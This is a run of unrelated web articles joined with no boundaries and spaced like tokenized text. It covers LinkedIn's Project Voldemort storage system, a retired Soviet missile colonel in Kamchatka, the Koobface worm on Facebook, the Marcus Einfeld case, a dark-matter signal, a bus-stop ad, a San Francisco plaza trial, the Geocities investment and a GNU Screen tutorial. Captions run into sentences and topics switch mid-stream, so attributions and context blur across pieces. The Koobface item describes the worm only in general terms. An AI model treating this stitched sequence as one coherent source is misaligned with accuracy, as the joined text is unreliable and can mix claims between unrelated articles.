As we grew , this database got split into a variety of remote services for serving up profiles , performing searches , interacting with groups , maintaining network updates , fetching companies , etc .
These databases may have read - only replicas , but we did n't have a system for scaling writes .
Unfortunately for engineers and DBAs , many of the rich features that people expect from a modern internet site either require massive data sets or high write loads , or both .
This became a problem as we looked at how to scale some write - intensive features like Who ’s Viewed My Profile that require as many updates as reads .
We faced a similar scale problem for offline computed data , such as finding similar profiles — the set of all user profiles is very large , but even a modest subset of the set of all user profile pairs is quite huge .
To handle this problem we looked at the systems other internet companies had built .
We really like Google 's Bigtable , but we did n't think it made sense to try to build it if you did n't have access to a low - latency GFS implementation .
Our primary goal was to get low - latency , high - availability access to our data .
For complex analysis we had Hadoop and databases , for complex queries we had a distributed search system , and the goal was n't to try to duplicate any of these .
We were inspired by Amazon 's Dynamo paper , which seemed to meet the needs we have as well as being feasible to implement with low - latency queries -- much of our design for Project Voldemort comes from that .
Our experience with the system so far has been quite good .
We were able to move applications that needed to handle hundreds of millions of reads and writes per day from over 400 ms to under 10ms while simultaneously increasing the amount of data we store .
Open Source
LinkedIn is a big open source user , and we have contributed back a number of the improvements to Lucene we have made such as Zoie , Kamikaze , and Bobo .
Most of the things we build are pretty Linked In - specific , but things like search and storage are pretty much stand - alone and we are happy to get other users ( and contributors ! ) .
I myself have been a long - time open source lurker — I am the first to check out the source , but rarely have the time to make any improvements .
Fortunately , even if most people are as lazy as me , not all are .
In the last few months we have got close to 50 contributions from people around the world .
Some are small , just doing a little cleanup , and others have been quite substantial introducing new features or major code improvements .
The long - term success of an open source project depends on its not being controlled by a single company , person , group , but forming a real self - sustaining group of interested developers .
This is our goal in working on the open source project .
LinkedIn is not a storage systems company , and neither are the other web companies facing some of the same problems , so we think we think we can all benefit by sharing our work in this area .
The Future
So what is next for the project ?
The most important feature for a storage system is always improving performance and reliability .
But there are a couple of other things in the works .
We are working on making it easier to incrementally add to clusters of servers , improving our support for batch computed data from Hadoop , and implementing some clients in other programming languages .
For more information on the project , check out the main site .
We are always looking for contributors to the project , so if you are interested check out the projects page and mailing list .
Ideas , bug reports , patches , etc. are all gladly accepted .
Interested in similar projects , check out the job openings at Linked In to work on it full time .
Stay tuned for upcoming blog posts that will reveal more details of the system internals and some of the lessons learned
The good old days of the Cold War
Russia 's officer corps will soon be decimated in the name of military reform , Tim Whewell discovers as he travels from base to base with a former colonel who had his finger on the button in the glory days of the Soviet nuclear deterrent .
The Kamchatka peninsula is 1,250 km long and boasts abundant wildlife I have never been to Kamchatka , but the name is thrilling enough .
From that jagged spur of land , thrusting its line of smoking volcanoes far out into the icy north Pacific , came , so my father supposed , the mysterious tins of Chatka crab that were the only taste of the Soviet Union available in Manchester groceries in the depths of the Cold War .
On rafts down the raging rivers of Kamchatka , I discovered later , hurtle adventurers who need only stretch out their arms to shake paws with the bears that fish for leaping salmon .
And in deep holes under the peninsula 's berry - laden wilderness are stashed nuclear missiles that could wipe us all out .
' Psychological endurance '
This I know from Colonel Viktor Tkachenko ( retired ) .
For four long years , at the end of the 1980s and beginning of the 1990s , he sat at the bottom of one of those shafts , keeping a rocket company .
At the far lonely end of the chain of command , his finger , not Gorbachev 's or Yeltsin's , would have pressed the fatal button .
A lover of wild things , of mountains , angling and sea-eagles , Colonel Tkachenko volunteered for Kamchatka , and for the strategic nuclear forces .
He is proud of the five years he studied for the job ; tested for his psychological endurance , intricate understanding of a missile 's anatomy and , in the scrupulous ideological way of the old USSR , his grasp of the politics and economics of the countries he might be required to zap .
Army reform
In American nuclear bunkers , he discovered to his contempt , officers merely called a contractor if their deadly charges appear in danger of malfunctioning , unable to repair the rockets themselves as their Russian opponents can .
The colonel shared these confidences - along with his compartment and a large plastic bottle of home - made brandy - as our train rattled for night after frosty night between military bases at the other , western , end of his country .
He was helping me out ( as a knowledgeable ex-officer ) on a tour organised by Russia 's Ministry of Defence , designed to show me the best of today 's armed forces on the eve of the biggest military reform since the Bolshevik Revolution .
The reform is intended to transform today 's sluggish , top - heavy army into a leaner , fitter fighting machine closer to Western models .
But the colonel 's heart was not really in the job .
He left his heart on Kamchatka .
Unique existence
While he sat there in his gloomy shaft , lavishing care on his deadly charges and flicked his fishing flies in those shining streams , his nation was waking bitter and bewildered from the stupor of state socialism .
Mikhail Gorbachev 's attempts at reform contributed to the end of the Cold War In August 1991 , as the coup against Gorbachev collapsed , the colonel - who had spoken out in favour of the conspirators - was called in by his commanding officer and given a choice .
He could leave the army quietly , or stay and face demotion .
The army was his life so he chose demotion , but he felt humiliated and betrayed .
How could he have known he was backing the losing side ?
In Moscow he might have caught the heady whiff of change , but not nine time zones away on Kamchatka among the bears , the berries , and the ballistic missiles .
And now , nearly 20 years on , the colonel sees other officers made expendable , betrayed like him in the sanctimonious name of reform .
The overhaul of the military , conceived by a civilian defence minister who once sold furniture , calls for the elimination over the next few years of two - thirds of the officer corps .
Of Russia 's 25,000 colonels , 16,000 will go .
Retirement poverty
In the British popular imagination , retired colonels live in rose - trimmed houses in Kent or Dorset .
They play golf , dabble in good works , and write indignant letters to the Daily Telegraph .
An outrageous stereotype , of course , but even the reality of their lives bears no comparison with that of their counterparts in Russia .
Colonels there earn the equivalent of £ 300 ( $ 420 ) a month .
What nest - egg can be carved out of that ?
And what cosy retirement can you plan for when there are already more than 100,000 homeless officers , a number that most fear will increase as the " reform " progresses ?
No wonder , as the snowy forests flash by , the colonel prefers to remember the old days on Kamchatka .
No wonder , well past midnight , as we shake out the last drops of brandy and rouse the sleepy conductress for a final glass of tea , he tells me I should forget military reform and make a better programme out there amid the volcanoes , about the glorious history of the Soviet nuclear deterrent .
And maybe I will .
Ballistics are not my field but I want to tell my father , before it is too late , that I tasted Chatka crab that was not from a tin .

Kaffet blir så mycket godare i en FZ - kopp - hur brygger du ditt ?
As Facebook readies itself for a complete profile page makeover , hackers are now striking fast and furious with a barrage of attacks aimed at all those associated with the social networking site .
The site has been exposed to five different security threats in this past week alone , including four new hoax applications that trick members into divulging usernames and passwords .
There are a number of reasons why hackers are attracted to social networking websites like MySpace and Facebook .
The interconnectedness of millions of people , coupled with pages and pages of personal information , make stealing an identity rather easy .
The most prolific virus to plague Facebook , however , is a new variant of the Koobface worm that has already wreaked havoc on thousands of vulnerable profile pages .
The virus installs malware on the computers of victims who mistakenly click onto the link of a false YouTube video suggested by a " friend " .
( Source : newsfactor.com )
Koobface : A ' Devious ' Virus
The Koobface worm is rather devious , because although it attacks social networking pages , the virus can be found and downloaded from virtually any website .
After a user visits a malicious site and unknowingly downloads the malware , the worm searches for cookies created by online social networks .
Once Koobface finds the social networking cookies , it makes a DNS query to check IP addresses that correspond to remote domains .
The server is then able to send and receive information regarding the infected machine and perform commands by remote through the victim's PC .
( Source : yahoo.com )
For example : an infected PC would could send an instant message claiming to be from a " friend " saying " check out the new Hannah Montana video . "
Intrigued , the victim 's friends clicks on the message to view the clip and their computers become infected and part of a botnet .
The cycle repeats itself .
Online Safety First
Of course , concerned individuals can protect themselves by consistently keeping their computers up to date , including operating system updates , up - to - date antivirus software , and anti-malware software .
As a rule of thumb , analysts also encourage users to consider which applications they choose to install on Facebook , think twice before clicking on links suggested by friends , and never install a video or audio codec from a random site .
First , a sense of proportion ; at the time Marcus Einfeld wrote a false name for the driver of the Lexus at the heart of the sorry case that saw him taken into custody this month , the maximum , I repeat , the maximum fine for making a false declaration of that nature was $ 1000 .
Second , a declaration : I 've known Marcus for 30 years and worked on many cases with him - some contentious , some not .
That said ; has there ever been a more pernicious avalanche of bile and hate by the press directed at a man who spent the previous 70 years of his life attempting to build a better Australia , a better world ?
A less circumspect man than myself might have written that he is not the first Jew they have crucified .
Peter Fitzsimons of this paper is not alone to query the crushing sentence of the Supreme Court .
The legal basis of the punishment will be analysed on any appeal that is lodged .
It will not be an easy task for an appeal court to choose between the judgment of a single judge and the misjudgment of a retired judge .
It is not the law I want to address : it has been full of holes - inadequate , chaotic and mysterious - since the Ten Commandments .
I make my living pointing this out .
But the whole head - on - a - stick reaction of the press , radio callers and lip - licking popularists is another matter ; it reeks of what mobs have always wanted - blood , especially if it is different from theirs .
It is embarrassing to witness .
It is cruel beyond words .
It should be un-Australian .
Oh , where are the angels of mercy ?
When should you be able to call upon the reservoir of good graces and goodwill you have built up over a lifetime ?
Why do we need sacrificial lambs ?
Signals could be from dark matter
By Victoria Gill
Science reporter , BBC News
Dark matter remains elusive despite strong evidence for its role Scientists have detected particles that may come from invisible " dark matter " .
This is thought to make up 23 % of the Universe , but can only be detected through its effects on " normal " matter .
Writing in the journal Nature , scientists relate how a satellite - borne instrument found an unexplained source of positrons in space .
But the researchers say their mysterious signal must be further investigated before they will know if they have " discovered dark matter " .
The space - based experiment , known as Pamela , was launched in June 2006 , and carries instruments designed to investigate dark matter particles .
Many leading theoreticians think this signal must come from dark matter
Piergiorgio Picozza
It detected an " excess " of positrons in an area where the scientists expected to see far fewer .
The instrument that recorded this signal was measuring the ratio of positrons - the anti-particles of electrons that have a positive rather than a negative charge - to electrons .
It found a relatively high ratio of positrons within a " high energy level " .
" The ratio [ of positrons to electrons ] should decrease with increasing energy , " said Piergiorgio Picozza , a professor at the University of Rome Tor Vergata , Italy , and one of the authors of the research .
" But we found that , at one particular energy range , it increases , and that 's not what we expected . "
Spinning stars " Since we know a lot about the background sources of positrons and electrons , we know what fraction we would expect to see at this particular energy level , " explained Nigel Smith , who carries out research into dark matter at the UK's Rutherford Appleton Laboratory but was not involved in this research .

The satellite carries instruments to identify particles and anti-particles
It is expected to orbit the Earth for a minimum of three years " It 's like light ; when you see different colours , you 're looking at photons - light particles - with different energies . "
However , there could be another explanation for the positrons .
They may come from pulsars - rapidly rotating , super - dense , dead stars that release lots of energy into the cosmos .
Nasa 's Fermi Gamma-ray Space Telescope , which was launched in June 2008 , is already taking measurements from pulsars and should produce data that could clarify the mysterious signal .
Professor Smith thinks pulsars provide the most likely explanation .
" It 's the simplest solution , " he said .
" I think everyone will be waiting for the Fermi data to come in . "
Professor Picozza agrees that pulsars offer a plausible , if less exciting , origin .
" Many leading theoreticians think this signal must come from dark matter , " he continued .
" But I do n't think this data alone is enough to claim that discovery .
What we have found is another primary source of positrons . "
He believes that the particles thought to constitute dark matter could be reproduced in the Large Hadron Collider ( LHC ) in Switzerland .
If , he said , this new signal does not match the data collected from pulsars , and if experiments in the LHC back - up the dark matter theoreticians , " then we could then say we have discovered dark matter " .

This bus ad for Fitness First in Rotterdam , The Netherlands gives you the hard sell via shame .
It uses a scale in the seat to display just how fat you are to everyone around .
Advertisement
I , for one , would be pretty pissed off if I did n't know about this thing and sat down to wait for the bus , only to notice people laughing at my weight .
It 's an attention grabbing ad , to be sure , but one that might just cross the line into ruining the bus stop rather than just advertising via it .
But hey , if it 's getting people to work out at Fitness First , it 's effective .
What say you ?

17th Street Closure Will Be First NYC - style Plaza in San Francisco
The future site of a pedestrian plaza at 17th and Market Streets
Do n’t look now , but NYC DOT Commissioner Janette Sadik - Khan ’s magic
may have rubbed off on DPW Director Ed Reiskin , to San Francisco’s
benefit .
Reiskin has been leading a multi-agency effort to close a
small portion of 17th Street where it meets Market Street to vehicle
traffic and convert the space into a trial pedestrian plaza , which
he hopes to see operational by May .
The historic trolley
that loads at the proposed location will still operate in the area , but
the DPW will put out planters and other moderately heavy stone elements
that will serve as seating and tables , much like Gansevoort Plaza in
New York City .
" As we ’ve seen what folks in New York City have done in
terms of taking excess asphalt and returning it to people , to more
diverse uses , we ’re inspired , " said Reiskin .
" The approach we ’re
taking here is to try it .
If it ’s great , it will be great .
If
not , we ’ll take it out . "
Reiskin has been coordinating the effort with the MTA , the Planning Department , Supervisor Bevan Dufty ,
the Castro Street Community Betterment District ( CBD ) , and the
Mayor ’s Director of Greening , Astrid Haryati .
Public Architecture , a
private firm , is working pro bono to create the design
for the new public space .
MTA Executive Director Nat Ford was very upbeat .
" We ’re really excited about this .
We ’ve been trying to identify locations
around the city to make these quick improvements that help us to green
the city and make it more pleasurable for pedestrians or workers who
want to have their lunch outside in public space . "
The boarding island for historic trolleys on 17th
Ford
acknowledged the trial
nature of the project , without burdensome planning and sometimes
lengthy delays , was unusual for the collaborating agencies , but said it would provide San Francisco with a testable scenario that
planning and modeling alone could not .
" I think the
citizens of the city want to see these improvements and going through
the lengthy process of planning does n’t always get the
project in the ground , " said Ford .
" What we ’re seeing from other
municipalities like NYC is very successful and we want to do similar
trials here . "
David Alumbaugh , acting Director of Citywide Planning at the Planning Department , was hopeful it would enliven the public realm .
" While cities all over the country and the world are
re-imagining their neglected public realms , for some reason doing so has been hard for San
Francisco .
This exciting temporary installation in the heart of the Castro will inexpensively and quickly
demonstrate one small way San Francisco might begin to rethink its public realm . "
Reiskin stressed several times the project is temporary , that they are using
using salvaged , recycled , or re-purposed materials from city salvage
yards , and that it will be easily reversible if it does n’t succeed at
activating the space and providing a valued community amenity .
Acknowledging the impact of meeting Sadik - Khan last November at
a luncheon held for various agency directors , Reiskin called her a
personal hero .
" She ’s a rockstar to me in this realm of effectively
and quickly accomplishing things . "
John
Peterson , founder of Public Architecture , said there
were significant obstacles to success in the trial plaza and that they would need
to adjust their effort in a fluid and ongoing way when those problems arise .
" Part of the reason this is an interesting project is that we expect to
remain active as we see how people will use it .
The challenge is to
knit something together that is cohesive , a proper outdoor space and
not a collection of bits and pieces .
New York City is doing a great
work , but we ’re trying to one - up the expectations on what is
possible for this type of urban space . "
Peterson
said they are searching for a partner to help draft a " deep evaluation "
of the success of the trial .
" We expect this kind of thing to be
useful not just for this project but for many other urban projects . "
Castro
Street CBD Executive Director Andrea Aiello said they had been
discussing ways to improve the public space there for nearly
a decade and that it was part of both the Castro Street CBD strategic
planning and the Upper Market Area Plan done by the Planning Department
at Superviser Dufty ’s behest .
She added the CBD was working on
ways to create dynamic programming for the space , including music and
other types of performances .
" The
CBD is very conscious of the need to keep this active so that it
does n’t fail .
We ’re very excited to work with the agencies to create
this very cool
gathering space for the neighborhood .
It has been a great
collaborative relationship with DPW , the Planning Departent and
Supervisor
Dufty .
It really feels like all the different agencies have come
together to make this experience work . "
Two businesses on the street have been particularly involved with the planning , the 24 - hour restaurant Orphan Andy ’s and the Chevron gas station .
Orphan
Andy ’s anticipates setting out tables and movable seating , which it would maintain , possibly in conjunction with the CBD .
Chevron agreed to have one of its curb cuts removed and Peterson believes they will be important partners in the late - night hours , when the plaza might not be otherwise active .
For
his part , Supervisor Dufty was hopeful that a trial would be a great
success .
" Temporarily closing 17th and Market will allow us to test a
number of streetscape improvements while monitoring the changes to
traffic flow , " he said .
" This is a major step towards creating a new
Castro public realm . "
" I appreciate the ingenuity and leadership
of DPW Director Ed Reiskin , the Castro Community Benefit District and
Planning Department .
I ’m excited to begin this process , " he added .
Peterson said the leadership from Reiskin and other agencies is refreshing .
The only reluctance he ’s heard has been from community stakeholders who are worried about the homeless and vagrants making the plaza less desirable .
Some people are very skeptical and people do n’t want to see change .
We ’re talking to people who are dedicated to urban life and there is real reluctance to even try it .
They are talking about homelessness .
There ’s the idea that we do n’t want nicer things in our public realm because people may misuse it .
That should n’t stop us from having a healthy street life and public realm .
If that ’s the case in San Francisco , then we ’re done . ”
Though the 17th Street trial will be temporary pending its success , the DPW and MTA are already looking for other areas that might be ripe for pilots ( in case they ’re reading , we ’d like to offer up this short film about a street in North Beach ) .
" The Mayor is interested in doing more than this one , but this one was
teed up , " Reiskin said .
" We ’ve seen it work elsewhere and it ’s consistent
with many themes the Mayor has put forward as goals . "
Said Ford : " We ’re making very quick improvements and making them reversible ….
and if [ the process ] works , we ’ll try it in other areas .
We have a short list of other areas that we ’d like to try , so stay tuned , there are more out there . "
Yesterday , TechCrunch reported the news that Yahoo ! is planning to shut down Geocities .
That is sad news on many levels .
Geocities was the web 's first community and it was my first " mega deal " when it was sold to Yahoo ! in 1999 for $ 3.5 bn ( including the value of the options Yahoo! assumed ) .
I learned a lot from that investment and I thought I 'd share some of the lessons with you all this morning .
My partner at Flatiron , Jerry Colonna , who led the Geocities investment , will read this post and will surely correct all the things I get a little wrong so make sure to read the comments .
I do have the benefit of having all the cap tables and investment memos still on my laptop so most of this is based on more than memory .
In the summer of 1996 , Jerry and I formed Flatiron Partners .
We wanted to focus exclusively on Internet investments .
We quickly rounded up two $ 75 mm commitments from SOFTBANK and Chase and by the fall we were off to the races .
Our first investment was Seth Godin 's company Yoyodyne which we had both been looking at while we were at our prior firms ( Jerry was at CMGI and I was at Euclid ) .
As we were considering what next investments to make , I suggested that we each pick a company from the portfolios of our prior firms to make an investment in .
I felt that we could use a couple " sure winners " and there is nothing like cherry picking a venture fund you know well to produce a sure winner .
Jerry liked that idea .
I picked Multex ( which went on to go public and then sell to Reuters for $ 250 mm ) .
Jerry picked Geocities .
Image of David Bohnett via Wikipedia
Jerry flew out to Los Angeles where Geocities was headquartered ( it was initially called Beverly Hills Internet ) and talked to David Bohnett , the founder of the company .
Jerry knew that the initial $ 2 mm that David had raised from CMGI was going to run out shortly and so he proposed that Flatiron invest $ 8 mm at a $ 10 mm pre-money valuation .
David immediately liked the idea of having Jerry as an investor .
He knew Jerry from CMGI and they had a great relationship .
But he hated the idea of selling 45 % of the company when he had already sold 50 % of it to CMGI earlier for $ 2 mm .
When we showed up , CMGI owned half the company and David owned less than 35 % .
The rest was in the hand of friends and family and options .
David felt that he had made a bad deal with CMGI and wanted to fix that in the next round .
So Jerry invited David and his brother Bill out to NYC to meet with the two of us and figure it out .
We went out to dinner at a place in the lobby of the Met Life Building ( which I still think of as the Pan Am Building ) and discussed the issue at length .
At that dinner , I proposed that we issue David 500,000 options as part of the financing which would be 10 % of the company post financing .
He and Bill went outside to talk it over and they came back and told us we had a deal .
So we drafted up a term sheet and sent it to David .
Flatiron and our partners SOFTBANK and Chase would lead an $ 8 mm financing at a $ 10 mm valuation .
CMGI would invest $ 2 mm of the $ 8 m m and we 'd issue 500,000 options to David .
We 'd add to the employee pool as well .
After the financing , Flatiron and our partners would own about 30 % for our $ 6 mm , CMGI would own about 33 % , and David would own north of 20 % .
David liked the proposal and he sent it to CMGI for their approval .
They hated it .
To this day , I 'm not sure if it was the fact that a former partner , Jerry , was showing up and attempting to invest in their little secret or if it was just the financial terms .
But whatever the case , they fought the idea for a while .
I do n't recall exactly what the delay was all about .
I assume they were looking around for a better option .
But finally they came to the table .
They demanded that we split the 500,000 options and give half of them to CMGI and half to David .
They saw them as a sweetener for David , which they were , and wanted to participate .
After a lot of back and forth , none of it pleasant , David conceded .
And in the late fall of 1996 , the financing closed .
Three years later , when Geocities was sold to Yahoo ! , those 500,000 options I came up with over dinner in the old Pan Am Building lobby were worth $ 234 mm .
By then they had split 2 for 1 twice and David had given a bunch of them to his co-founders .
CMGI still had all of theirs .
We decided to invite a couple of other VCs into the deal .
I was concerned that Geocities was in LA and we were in NYC and CMGI was in Boston .
I felt that we needed a local VC to " watch over the deal " .
The only VC I knew in LA was Harry Lambert of Innocal , who had previously been at Innoven in New Jersey .
So I called up Harry and asked him to go see David .
They hit it off and so we allocated $ 1.75 mm of the deal ( which we increased to $ 9 mm ) to Innocal .
We also invited Intel into the deal , also allocating them $ .175 mm .
Between Intel , Innocal , SOFTBANK 's Charley Lax , and Bob Greene from Chase , we had quite a few VCs involved in that first round .
I 've always felt that syndicating a deal to other VCs who can be helpful is a good idea .
In the case of Geocities , we cut ourselves back by $ 3.5 mm , which ultimately became worth $ 500 mm , and I 'd do it all over again .
Intel was n't particularly helpful as investors , but their brand was helpful to the company who used it actively .
But Harry was a big help .
Less than six months after we made our investment , the company was burning through cash and there were no financial controls in place .
Harry showed up with his team and got things under control , fixed the financial management , and bought enough time to get another round raised .
As we were getting ready to close our initial round of financing , the November 1996 Media Metrix numbers came out .
Geocites , which was growing like crazy , had made it into the top ten .
I turned to Jerry ( we shared an office back then ) and said to him with a big smile " we are about to invest in one of the top ten internet companies in the world at a $ 10 mm valuation . "
Not many people understood how big a deal that was back then , but we did .
We did not have an investment analyst on our team at that time and we needed to do a lot of work on the market and what the other home page services were and what their tools were like .
Jerry called up Jason Calacanis , who I had not met at the time , and we brought him in and hired him as a consultant .
He was young and smart and a wiseass .
Some things do n't change .
Jason did all of our deep analysis on the Geocities deal .
He did n't get any Geocities stock out of it , but he did get Flatiron as the advertising sponsor for the first issue of Silicon Alley Reporter out of that gig .
After Harry and his team got the finances under control , Geocities started to prepare for another round of financing .
It was the summer of 1997 and the Internet investing climate was not great .
We did an insider round at 4 x the last round price and raised another $ 5 mm .
But by the end of 1997 and into early 1998 , things were heating up and SOFTBANK and Yahoo ! had their eyes on Geocities .
The two companies proposed to invest $ 25 mm into the company at a $ 225 mm valuation and also do a $ 50 mm secondary purchase from the investors .
All of the investors in the initial round other than CMGI and SOFTBANK participated and Flatiron and Chase sold a third of our position to SOFTBANK and Yahoo ! at $ 15 / share ( post a 2/1 split so actually $ 30 / share pre split ) .
That was almost 10 x on our purchase price in less than two years .
By selling a third of our position for 10 x what we paid , we locked in a 3 x on the deal and still had 2/3 of our investment working for us .
When the company went public a year later and eventually sold for $ 120 / share to Yahoo ! , Jerry and Bob Greene ( our partner at Chase and eventually our partner at Flatiron ) asked ourselves if we had made a mistake selling a third of our position in December 1997 and January 1998 .
I did n't think so and I still do n't .
Yes , the shares we sold for $ 15 / share would have split 2/ 1 once more and would have been worth $ 120 / share in the Yahoo !
sale , but I do n't think you ever should regret taking a 10 x gain and taking some money off the table .
We did that and I do n't regret it one bit .
The rest of the story is pretty well known .
Around the time of the Yahoo!/ SOFTBANK investment , David recruited Tom Evans to join the company as CEO .
Tom took the company public in 1998 and sold it to Yahoo ! in 1999 .
Tom did not join Yahoo !
and went on to build and run several very successful public companies .
David made a bundle in the sale of Geocities , turned his energies to other interests for a number of years , but is now back in the saddle as the founder of another internet startup in LA .
And Jerry , Bob , and I went on to exit from dozens of internet deals in 1998 , 1999 , and 2000 before the market blew up and Flatiron stopped making investments in the summer of 2000 .
Between all the big exits we had in Flatiron and a number I 've had since , you might think that Geocities is just another deal .
But for me , it was the first rocket ship ride I had in the venture business and it will always have a special place in my head and heart because of that .
I learned a lot from that deal .
I learned that the Internet is all about people expressing themselves on pages they own and control .
I learned that a business deal made over dinner and a handshake can turn into hundreds of millions of dollars , I learned that good partners are worth every penny of returns you give up to get them , and I learned that selling too soon is not too painful as long as you do n't sell too much .
And most of all I learned that you can make 100 times your investment every once in a while .
And when you do , it 's something special .

Harry Potter may have his wand , Thor may have Mjöllnir , and Buckethead may have his axe , but all those gizmos pale in power to the QWERTY .
With a few taps at the command line , you can launch a Web site , recruit legions to your cause , or vanquish a marauding thunder lizard .
Alas , even the mighty QWERTY has a fatal weakness :
It succumbs easily to a cut connection .
A noisy phone line , a lost cellular or wireless connection , or a network time - out spells certain death for a remote shell .
If you ’ve spent hours on a task , such as debugging an application , it can be frustrating and maddening to lose your work in an instant .
But do n’t smash Mjöllnir into your head .
Instead , adopt GNU Screen .
Screen creates and manages multiple shell windows within a console ( say , a dumb terminal physically connected to the host ) , an xterm window , or a Secure Shell ( SSH ) login .
You can switch from one shell window to another in a flash , and you can leave shells running perpetually and reconnect at any time .
Effectively , Screen provides many virtualized consoles .
Figures 1 through 5 picture the features and operation of Screen .
Looking at Figure 1 , assume that you have used SSH to log in to a remote host .
Initially , you have your original shell on your local host ( say , your laptop or desktop ) and a remote shell .
As usual , you can use the remote shell to run commands on the remote host ; output is encrypted and sent over the SSH connection to your local shell .
( In the figures , blue highlights the shell output that is currently visible . )
As lamented above , if your local shell or the remote shell or the connection between the two is terminated , the remote shell is terminated , taking your work to the big bit bucket in the sky .
Figure 1 . A typical SSH connection
Figure 2 depicts state after you launch Screen on the remote host .
The Screen utility launches and in turn spawns a new shell window , A , in which you can run commands .
The output of A is visible , as connoted by blue ; the output comes from the shell , traverses through Screen , goes through the remote login , and over the SSH connection , arriving at your local login .
Figure 2 . Screen manages shell windows
Screen does not have a presence per se ; it ’s a proxy to select among the available and running windows it manages .
Screen can only show the output of one window at a time .
Think of Screen as a virtual keyboard - video - mouse ( KVM ) switch .
But you can also detach from Screen , as shown in Figure 3 .
The Screen proxy persists , as do all windows it controls , but the connection to Screen is temporarily severed , returning you to the prompt of your remote login shell .
Figure 3 .
You can detach from Screen and its windows persist
Figure 4 shows a possible , eventual scenario .
The connection to Screen has been reestablished , and two additional windows — B and C — have been created .
Windows A and B continue to run a shell and any subordinate jobs , yet only the output of C is visible .
Of course , you can switch among the windows to monitor the state of your varied jobs .
Figure 4 . Screen can manage multiple windows
Finally , Figure 5 captures conditions if you detach from Screen and terminate your remote login .
Screen and its windows persist .
You can log in anew , reconnect to Screen ( and by proxy to its windows ) , and carry on unperturbed .
Figure 5 .
You can detach and reattach to Screen at will
If you regularly access a remote server to perform maintenance or develop software , GNU Screen is indispensable .
Building and installing Screen
The original version of Screen was released more than 10 years ago , so chances are your system has the utility — typically named / usr / bin / screen .
However , if your system lacks Screen , it is easily installed from your distribution ’s package manager .
For example , if you use a variant of Debian Linux® , such as Ubuntu , you can install Screen in one step with apt - get :
sudo apt - get install screen
Show more Show more icon
Alternatively , if you prefer to build from source , visit the GNU Screen project page ( see Related topics for a link ) , and download the latest code bundle .
As of this writing , the most recent release of Screen is version 4.0.3 , posted just months ago , in August 2008 .
To build and install from scratch , download and extract the code , change to the resulting source directory , and run the typical ./ configure , make , and sudo make install sequence :
$ wget http://ftp.gnu.org/gnu/screen/screen-4.0.3.tar.gz

Screen is now installed and ready to use .
Type man screen to view the utility ’s man page .
Getting started with Screen
To use Screen , just launch it .
When the license message appears , click Return ; you should now see a new login shell prompt .
( In the transcripts below , a nickname has been artificially added before each shell prompt to differentiate between the numerous shell instances and to draw parallels with Figures 1 through 5 . )
Local $ ssh remote.example.com
Last login : Sun Dec 21 17:23:16 2008 from local.example.com
Remote $ hostname remote.example.com
Remote $ screen A $ top Show more Show more icon
Your state now mirrors that of Figure 2 .
A Screen session is running ( albeit unseen ) , and window A is active , running the top system monitor , which refreshes system performance information every few seconds .
To temporarily detach from the Screen session and all its windows , click Ctrl - a , then d ( lowercase D for “ detach ” ) .
Ctrl -a is the Screen command prefix , and d is the specific command to detach .
You are now in the scenario shown in Figure 3 .
The Screen session and window A remain alive .
To verify , run screen - list :
$ screen - list There is a screen on : 21020.pts -2.remote ( Detached ) 1 Socket in / tmp / screens / S-strike .
Show more
Show more icon
The screen - list command shows all available screen sessions .
( As an aside , you can have multiple screen sessions running simultaneously , each with its own set of concurrent windows .
This is shown in Figure 6 .
Each screen instance tracks its own current window .
Some tips on the advanced use of Screen such as this are presented later . )
The session numbered 21020 is detached and marked accordingly .
Because only one screen session exists , you can reattach to it directly with screen -r .
Oblivious to Screen ’s machinations , top continues uninterrupted .
Figure 6 . Screen provides multiple sessions , each with multiple windows
To recreate Figure 4 , reattach to the current session , then click Ctrl - a , then c ( lowercase C for “ create ” ) to create a new window .
Next , click Ctrl - a , then c again .
You now have one Screen session managing three windows .
To view the available windows in a session in a menu - like interface , click Ctrl-a , then the double quotation mark ( " ) key in the current window :
Num Name Flags 0 bash $ 1 bash $ 2 bash $ Show more Show more icon
By default , the name of a window is taken from the first command it launches — commonly , a shell .
Hence , there are three bash windows in the menu above .
To navigate the window menu , use the arrow keys to move up and down the list ; to choose a window , simply press Return .
To dispose of the current window , type exit at the window ’s shell prompt , or click the keyboard shortcut Ctrl - a , then k ( lowercase K for “ kill ” ) .
If you use the latter method , an alert appears at the bottom of the window to confirm that you want to kill the window .
Click y ( lowercase y for “ yes ” ) to acknowledge or n ( lowercase n for “ no ” ) to reject the command .
If you kill all the windows running under a Screen session , the originating screen command prints a message and is terminated :
Remote $ screen ... Create and manipulate windows ... ...
Exit from all windows ... [ screen is terminating ]
Remote $ screen - list No Sockets found in / tmp / uscreens / S-supergiantrobot .
Show more

If you ’re following along and have killed all the open windows , the screen - list command yields
No sockets ... , indicating that no screen sessions are available .
Smarter screens
So far , you ’ve seen how to create multiple windows within a Screen session .
Alone , this is enough to persist your command - line work and never lose work again .
Admittedly , however , managing seemingly identical , concurrent windows can become confusing ; it would be superior if you could easily differentiate between one window and another without opening each one , especially if any amount of time passes between a detach and a reattach .
Indeed , Screen provides a number of options and tools to customize your work environment .
You can name each window , and you can place a status bar at the bottom of each window to differentiate one from another .
To name a window , activate the window .
Click Ctrl-a A ( uppercase A , for “ Annotate ” ) , click Backspace as needed to elide any existing moniker , then type a meaningful name at the prompt :
Num Name Flags 0 Window A $ 1 Window B $ 2 Window C $ Show more
Show more icon
This is shown in Figure 7 , where a window is tagged Window A . A window nickname need not be unique .
Figure 7 .
You can assign a descriptive name to each window
You can provide yourself additional visual cues to distinguish among windows with a status bar .
Launch your favorite text editor , and create the file . screenrc in your home directory with the following lines :
hardstatus on hardstatus alwayslastline hardstatus string " %{.bW} %-w % {.rW}%n %t%{-}%+w %= %{.. G} %H %{.. Y} %m/%d %C%a " Show more Show more icon
With such a . screenrc configuration file in place , each new window displays a status line , including the window ’s name .
Figure 8 shows a window with a status line .

Use the status line to help identify each window at a glance
Helpful Screen tips
Screen has too many features to list in a brief introduction , but fluent use requires just a modicum of know - how and a few helpful options .
Here are some additional pointers :
Type screen without any arguments in any window to open a new window .
Clicking Ctrl-a , then c and typing ** screen * * are synonymous , except that the latter provides command - line options to immediately configure the new session .
Clicking , then and typing are synonymous , except that the latter provides command - line options to immediately configure the new session .
You can name a window when you create it with screen -t _name .
For instance , to create a new window and tag it debugger , go to a Screen - managed window , then type ** screen -t debugger ** .
If you open the window menu , one of your options should be marked debugger .
For instance , to create a new window and tag it debugger , go to a Screen - managed window , then type .
If you open the window menu , one of your options should be marked debugger .
If you ’ve detached from a Screen session , you can reattach to a specific window with screen -p _ID , where ID is a number or a name .
Let ’s try it : Local $ ssh remote.example.com
